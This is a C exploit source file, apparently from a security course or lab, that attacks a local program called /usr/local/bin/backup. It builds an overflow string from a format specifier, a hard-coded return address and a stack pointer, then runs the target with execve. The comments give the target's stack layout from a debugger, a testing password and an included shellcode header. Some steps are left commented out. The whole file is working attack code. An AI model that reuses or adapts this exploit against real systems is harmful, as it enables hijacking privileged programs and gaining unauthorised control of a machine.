/*
 * Buffer Overflow Sploit
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include "shellcode.h"

#define TARGET "/usr/local/bin/backup"
#define TESTING_PASSWORD "xf35+"

int main(void)
{
  char *args[6];
  char *env[1];
  char* arg_one; 
  int i,j;
  char* RETURN_ADDRESS;
  char* words[4];
  char* word;
  // Values in main
  // 0xffbfde58: 0xffbfdeb8 // 
  // 0xffbfde5c: 0x40038450
  // 0xffbfde60: 0x00000005 // argc=5
  // 0xffbfde64: 0xffbfdee4 // argv pointer
  //
  // Values in Usage:
  // output: 0xffbfdd54 // Where to build from
  // arglist: 
  // 	0xffbfddb8 == 160 bytes difference
  //Need to map main's values into stack. These are mains
  // eip = 0x8048f40 in main (backup.c:187); saved eip 0x40038450
  // Arglist at 0xffbfde58, args: argc=4, argv=0xffbfdee4
  //  Locals at 0xffbfde58, Previous frame's sp is 0xffbfde60

  // These are the ones in checkPassword
  //  Arglist at 0xffbfddd8, args: user_pw=0xffbfdfe0 "xf35+"
  //  Locals at 0xffbfddd8, Previous frame's sp is 0xffbfdde0

  // End result needs to be 
  RETURN_ADDRESS = "\x5f\x8f\x04\x08";
 
  //shellcode is 45 bytes + 8 bytes from string + 47 bytes from spacing + 4 for arglist before RA = 
  arg_one = malloc(112 * sizeof(char));
  strcpy(arg_one, "%96d");
  
  // 0xffbfde38 argflist pointer before RA
 //strcat(arg_one, "\x38\xde\xbf\xff");

  // Load RA at 104
  strcat(arg_one, "\x5f\x8f\x04\x08");
  strcat(arg_one, "\x38\xde\xbf\xff");
  strcat(arg_one, "\0");
// abpove  strcat(arg_one, "\x38\xde\xbf\xff");
// 
//  // Fill buffer up to 160.
//  strcat(arg_one, "%39d");
//  
//  // Put back arglist for main
//  i = 0;
//  for (i = 2; i < 4; i++) {
//      strcat(arg_one, words[i]);
//  };
  args[0] = arg_one;
  args[1] = "backup";
  args[2] = "test.txt";
  args[3] = "NOT_AN_aCTuAl_pASsWoRd";
  args[4] = "EXTRA ARG";
  args[5] = NULL;
  env[0] = NULL;
  fprintf(stdout, " String length: %d\n", strlen(arg_one));
  // execve() executes the target program by overwriting the
  // memory of the process in which execve() is executing, i.e., 
  // execve() should never return
  if (execve(TARGET, args, env) < 0){
    fprintf(stderr, "execve failed.\n");
  }
  exit(0);
}
